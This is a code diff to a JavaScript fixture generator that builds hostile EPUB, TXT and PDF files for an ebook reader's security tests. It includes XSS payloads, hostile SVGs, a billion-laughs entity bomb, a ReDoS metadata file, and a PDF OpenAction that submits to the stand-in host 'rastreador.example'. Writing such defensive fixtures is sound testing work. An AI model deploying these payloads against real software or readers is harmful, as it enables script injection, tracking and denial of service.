@@ -5,6 +5,7 @@ import { dirname, join } from 'node:path';
 import { fileURLToPath } from 'node:url';
 import { zipSync, strToU8 } from 'fflate';
 import { PDFDocument, StandardFonts } from 'pdf-lib';
+import { PDFName, PDFString } from 'pdf-lib';
 
 export const FIXTURE_DIR = join(dirname(fileURLToPath(import.meta.url)), '.generated');
 
@@ -286,7 +287,201 @@ export async function gerarFixtures(dir = FIXTURE_DIR) {
     const r = rng(1000 + i);
     gravar(`mini-${i}.txt`, `Livro ${String.fromCharCode(64 + i)}${i}\n\nCapítulo 1\n\n${paragrafo(r, 4)}\n\n${paragrafo(r, 4)}\n\nCapítulo 2\n\n${paragrafo(r, 4)}\n`);
   }
+  // Conteúdo hostil (segurança e privacidade): ver e2e/seguranca.spec.ts.
+  gravar('malicioso.epub', epubMalicioso());
+  gravar('entidades.epub', epubEntidades());
+  gravar('redos.epub', epubRedos());
+  gravar('malicioso.txt', txtMalicioso());
+  gravar('malicioso.pdf', await pdfMalicioso());
   return saida;
+}
+
+// --- Fixtures hostis (segurança) ---
+// Todo endereço externo aponta para um domínio reservado (.example): os testes interceptam e registram
+// qualquer requisição que saia de localhost, então nada chega à rede de verdade.
+export const RASTREADOR = 'http://rastreador.example';
+
+/** Título e autor com HTML (escapado no XML, portanto texto literal depois de decodificado). */
+export const TITULO_MALICIOSO = `<img src=x onerror="window.__pwned='titulo'">Livro <b>Malicioso</b>`;
+export const AUTOR_MALICIOSO = `<script>window.__pwned='autor'</script>Autora & Cia`;
+export const SUMARIO_MALICIOSO = `<img src=x onerror="window.__pwned='sumario'">Capítulo hostil`;
+export const TITULO_TXT_MALICIOSO = `<img src=x onerror="window.__pwned='txt'">Texto hostil`;
+export const TITULO_PDF_MALICIOSO = `<img src=x onerror="window.__pwned='pdf'">PDF hostil`;
+
+function escXml(s) {
+  return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
+}
+
+/** SVG com script, eventos, imagem externa, foreignObject e @import: deve ficar inerte quando usado como imagem. */
+function svgHostil(marca) {
+  return `<?xml version="1.0" encoding="utf-8"?>
+<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="300" viewBox="0 0 200 300" onload="window.__pwned='${marca}-onload'">
+<script>window.__pwned='${marca}-script'; fetch('${RASTREADOR}/${marca}-fetch');</script>
+<style>@import url(${RASTREADOR}/${marca}.css); rect { fill: url(${RASTREADOR}/${marca}-fill.svg#g); }</style>
+<rect width="200" height="300" fill="#357"/>
+<image href="${RASTREADOR}/${marca}-image.png" xlink:href="${RASTREADOR}/${marca}-xlink.png" width="20" height="20"/>
+<foreignObject width="200" height="100"><div xmlns="http://www.w3.org/1999/xhtml"><img src="${RASTREADOR}/${marca}-foreign.png"/><iframe src="${RASTREADOR}/${marca}-frame.html"></iframe></div></foreignObject>
+<a href="javascript:window.__pwned='${marca}-link'"><text x="10" y="40">svg</text></a>
+</svg>`;
+}
+
+function epubMalicioso() {
+  const R = RASTREADOR;
+  const png1x1 = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==';
+  const head =
+    `<meta charset="utf-8"/><title>c1</title>` +
+    `<base href="${R}/base/"/>` +
+    `<meta http-equiv="refresh" content="0;url=${R}/refresh"/>` +
+    `<meta http-equiv="Content-Security-Policy" content="default-src *"/>` +
+    `<link rel="stylesheet" href="${R}/estilo.css"/>` +
+    `<link rel="prefetch" href="${R}/prefetch"/>` +
+    `<script src="${R}/cabecalho.js"></script>` +
+    `<script>window.__pwned='head-script'</script>` +
+    `<style>@import url(${R}/importado.css); body { background: url(${R}/fundo.png); } @font-face { font-family: x; src: url(${R}/fonte.woff2); }</style>`;
+  const corpo =
+    `<h1>Capítulo malicioso</h1>` +
+    `<p>Texto seguro antes do script.<script>window.__pwned='script-inline'</script> Texto depois do script.</p>` +
+    `<script src="${R}/externo.js"></script>` +
+    `<p>Pixel: <img src="${R}/pixel.gif" width="1" height="1" alt="pixel de rastreamento"/></p>` +
+    `<p><img src="https://rastreador.example/https.gif" srcset="${R}/a.png 1x, ${R}/b.png 2x" alt="srcset externo"/></p>` +
+    `<p><img src="//rastreador.example/protocolo-relativo.gif" alt="protocolo relativo"/></p>` +
+    `<p><img src="data:image/png;base64,${png1x1}" alt="imagem data"/></p>` +
+    `<p><img src="blob:${R}/blob" alt="imagem blob"/></p>` +
+    `<figure><img src="img/ok.png" alt="imagem local" onload="window.__pwned='onload'" onerror="window.__pwned='onerror'"/></figure>` +
+    `<p><img src="nao-existe.png" alt="sem arquivo" onerror="window.__pwned='onerror-ausente'"/></p>` +
+    `<figure><img src="img/desenho.svg" alt="svg hostil"/></figure>` +
+    `<figure><img src="img/falso.png" alt="html disfarçado de imagem"/></figure>` +
+    `<p>Um <a href="javascript:window.__pwned='href-javascript'" onclick="window.__pwned='onclick'">link javascript</a> no meio.</p>` +
+    `<p>Um <a href="${R}/fora" target="_blank">link externo</a> e <a href="data:text/html,&lt;script&gt;window.__pwned='data-href'&lt;/script&gt;">link data</a>.</p>` +
+    `<iframe src="${R}/quadro.html"></iframe>` +
+    `<iframe srcdoc="&lt;script&gt;parent.__pwned='srcdoc'&lt;/script&gt;"></iframe>` +
+    `<object data="${R}/objeto.swf" type="application/x-shockwave-flash"><param name="movie" value="${R}/objeto.swf"/></object>` +
+    `<embed src="${R}/embutido.swf"/>` +
+    `<form action="${R}/formulario" method="post"><input name="senha" value="segredo"/><button type="submit">Enviar formulário</button></form>` +
+    `<svg xmlns="http://www.w3.org/2000/svg" width="10" height="10" onload="window.__pwned='svg-onload'"><script>window.__pwned='svg-script'</script>` +
+    `<foreignObject width="10" height="10"><div xmlns="http://www.w3.org/1999/xhtml"><img src="${R}/foreign.png"/>Texto no foreignObject</div></foreignObject>` +
+    `<image href="${R}/svg-image.png" width="10" height="10"/></svg>` +
+    `<style>p { color: red !important; } body { background-image: url(${R}/corpo.png); }</style>` +
+    `<link rel="stylesheet" href="${R}/corpo.css"/>` +
+    `<p style="background-image:url(${R}/inline.png)" onmouseover="window.__pwned='mouseover'">Parágrafo com estilo inline.</p>` +
+    `<video src="${R}/video.mp4" poster="${R}/poster.png" autoplay="autoplay"></video><audio src="${R}/audio.mp3" autoplay="autoplay"></audio>` +
+    `<p title="${'A'.repeat(1_000_000)}" data-x="${'Z'.repeat(500_000)}">Parágrafo com atributo gigante.</p>` +
+    `<p><img src="img/ok.png" alt="${'B'.repeat(100_000)}"/></p>` +
+    `<p>Fim do capítulo malicioso.</p>`;
+  const c1 =
+    `<?xml version="1.0" encoding="utf-8"?>\n<html xmlns="http://www.w3.org/1999/xhtml" lang="pt-BR"><head>${head}</head><body onload="window.__pwned='body-onload'">${corpo}</body></html>`;
+  // HTML malformado (não é XML válido): força o caminho de fallback do parser HTML.
+  const c2 =
+    `<html><head><title>c2</title><script>window.__pwned='c2-head'</script></head><body>` +
+    `<h1>Capítulo em HTML quebrado</h1>` +
+    `<p>Entidade HTML&nbsp;sem DTD e tag sem fechar` +
+    `<p>Imagem: <img src=x onerror="window.__pwned='c2-onerror'">` +
+    `<p><svg><script>window.__pwned='c2-svg'</script><foreignObject><iframe src="${R}/c2.html"></iframe></foreignObject></svg>` +
+    `<p>Noscript: <noscript><img src="${R}/noscript.gif"></noscript>` +
+    `<template><img src="${R}/template.gif" onerror="window.__pwned='template'"></template>` +
+    `<p>Texto final do HTML quebrado.` +
+    // Payload de mXSS por último: o <style> sem fechamento engole o resto do documento.
+    `<math><mtext><table><mglyph><style><img src=x onerror="window.__pwned='mxss'">`;
+  const opf = `<?xml version="1.0" encoding="utf-8"?>
+<package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="id">
+<metadata xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:identifier id="id">urn:uuid:folha-e2e-malicioso</dc:identifier><dc:title>${escXml(TITULO_MALICIOSO)}</dc:title><dc:creator>${escXml(AUTOR_MALICIOSO)}</dc:creator><dc:language>pt-BR</dc:language><meta name="descricao" content="${'D'.repeat(200_000)}"/></metadata>
+<manifest><item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/><item id="c1" href="c1.xhtml" media-type="application/xhtml+xml"/><item id="c2" href="c2.html" media-type="text/html"/><item id="ok" href="img/ok.png" media-type="image/png"/><item id="desenho" href="img/desenho.svg" media-type="image/svg+xml"/><item id="falso" href="img/falso.png" media-type="text/html"/><item id="capa" href="img/capa.svg" media-type="image/svg+xml" properties="cover-image"/></manifest>
+<spine><itemref idref="c1"/><itemref idref="c2"/></spine></package>`;
+  const nav = XHTML(
+    'Sumário',
+    `<nav epub:type="toc"><ol><li><a href="c1.xhtml">${escXml(SUMARIO_MALICIOSO)}</a></li><li><a href="c2.html">Capítulo em HTML quebrado</a></li></ol></nav>`,
+  );
+  return zipEpub({
+    'META-INF/container.xml': CONTAINER,
+    'OEBPS/content.opf': opf,
+    'OEBPS/nav.xhtml': nav,
+    'OEBPS/c1.xhtml': c1,
+    'OEBPS/c2.html': c2,
+    'OEBPS/img/ok.png': new Uint8Array(makePng(120, 80)),
+    'OEBPS/img/desenho.svg': svgHostil('desenho'),
+    'OEBPS/img/capa.svg': svgHostil('capa'),
+    'OEBPS/img/falso.png': `<html><body><script>window.__pwned='falso'</script><img src="${R}/falso.gif"></body></html>`,
+  });
+}
+
+/** "Billion laughs" (entidades aninhadas) no OPF e no XHTML, mais uma expansão quadrática. */
+function epubEntidades() {
+  const dtd = (raiz) => {
+    const linhas = ['<!ENTITY lol "lol">'];
+    for (let i = 1; i <= 9; i++) linhas.push(`<!ENTITY lol${i} "${`&lol${i === 1 ? '' : i - 1};`.repeat(10)}">`);
+    linhas.push(`<!ENTITY grande "${'x'.repeat(50_000)}">`);
+    return `<!DOCTYPE ${raiz} [\n${linhas.join('\n')}\n]>`;
+  };
+  const opf = `<?xml version="1.0" encoding="utf-8"?>
+${dtd('package')}
+<package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="id">
+<metadata xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:identifier id="id">urn:uuid:folha-e2e-entidades</dc:identifier><dc:title>Livro de Entidades &lol9;</dc:title><dc:creator>&lol9;</dc:creator><dc:language>pt-BR</dc:language></metadata>
+<manifest><item id="c1" href="c1.xhtml" media-type="application/xhtml+xml"/><item id="c2" href="c2.xhtml" media-type="application/xhtml+xml"/></manifest>
+<spine><itemref idref="c1"/><itemref idref="c2"/></spine></package>`;
+  const xhtml = (corpo) =>
+    `<?xml version="1.0" encoding="utf-8"?>\n${dtd('html')}\n<html xmlns="http://www.w3.org/1999/xhtml" lang="pt-BR"><head><title>e</title></head><body>${corpo}</body></html>`;
+  return zipEpub({
+    'META-INF/container.xml': CONTAINER,
+    'OEBPS/content.opf': opf,
+    'OEBPS/c1.xhtml': xhtml(`<h1>Risadas</h1><p>&lol9;</p><p>Parágrafo normal depois das entidades.</p>`),
+    'OEBPS/c2.xhtml': xhtml(`<h1>Quadrática</h1><p>${'&grande;'.repeat(20_000)}</p><p>Fim da expansão quadrática.</p>`),
+  });
+}
+
+/** OPF com milhares de <dc:title> sem fechamento: dispara busca quadrática nas expressões regulares do OPF. */
+function epubRedos() {
+  const opf = `<?xml version="1.0" encoding="utf-8"?>
+<package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="id">
+<metadata xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:identifier id="id">urn:uuid:folha-e2e-redos</dc:identifier>${'<dc:title>x'.repeat(80_000)}</metadata>
+<manifest><item id="c1" href="c1.xhtml" media-type="application/xhtml+xml"/></manifest>
+<spine><itemref idref="c1"/></spine></package>`;
+  return zipEpub({
+    'META-INF/container.xml': CONTAINER,
+    'OEBPS/content.opf': opf,
+    'OEBPS/c1.xhtml': XHTML('c1', '<h1>Capítulo único</h1><p>Texto curto do livro com OPF hostil.</p>'),
+  });
+}
+
+function txtMalicioso() {
+  return [
+    TITULO_TXT_MALICIOSO,
+    '',
+    'Capítulo 1',
+    '',
+    `Parágrafo com <script>window.__pwned='txt-script'</script> e <iframe src="${RASTREADOR}/txt.html"></iframe> no meio.`,
+    '',
+    `<img src="${RASTREADOR}/txt-pixel.gif" onerror="window.__pwned='txt-img'"> e <a href="javascript:window.__pwned='txt-link'">link</a>.`,
+    '',
+    'Capítulo 2',
+    '',
+    `<style>@import url(${RASTREADOR}/txt.css);</style><svg onload="window.__pwned='txt-svg'"></svg> fim.`,
+    '',
+  ].join('\n');
+}
+
+/** PDF com metadados em HTML, ação JavaScript ao abrir e link externo. */
+async function pdfMalicioso() {
+  const doc = await PDFDocument.create();
+  doc.setTitle(TITULO_PDF_MALICIOSO);
+  doc.setAuthor(`<script>window.__pwned='pdf-autor'</script>Autor`);
+  const font = await doc.embedFont(StandardFonts.Helvetica);
+  const page = doc.addPage([595, 842]);
+  page.drawText(`Texto do PDF com <script>window.__pwned='pdf-texto'</script> literal.`, { x: 50, y: 760, size: 12, font });
+  page.drawText('Segunda linha do PDF hostil, que deve virar texto comum.', { x: 50, y: 740, size: 12, font });
+  const ctx = doc.context;
+  const js = ctx.register(ctx.obj({ Type: 'Action', S: 'JavaScript', JS: PDFString.of("app.alert('pwned'); this.submitForm('" + RASTREADOR + "/pdf-form');") }));
+  doc.catalog.set(PDFName.of('OpenAction'), js);
+  const link = ctx.register(
+    ctx.obj({
+      Type: 'Annot',
+      Subtype: 'Link',
+      Rect: [50, 700, 300, 720],
+      Border: [0, 0, 0],
+      A: { Type: 'Action', S: 'URI', URI: PDFString.of(`${RASTREADOR}/pdf-link`) },
+    }),
+  );
+  page.node.set(PDFName.of('Annots'), ctx.obj([link]));
+  return Buffer.from(await doc.save());
 }
 
 if (process.argv[1] && fileURLToPath(import.meta.url) === process.argv[1]) {
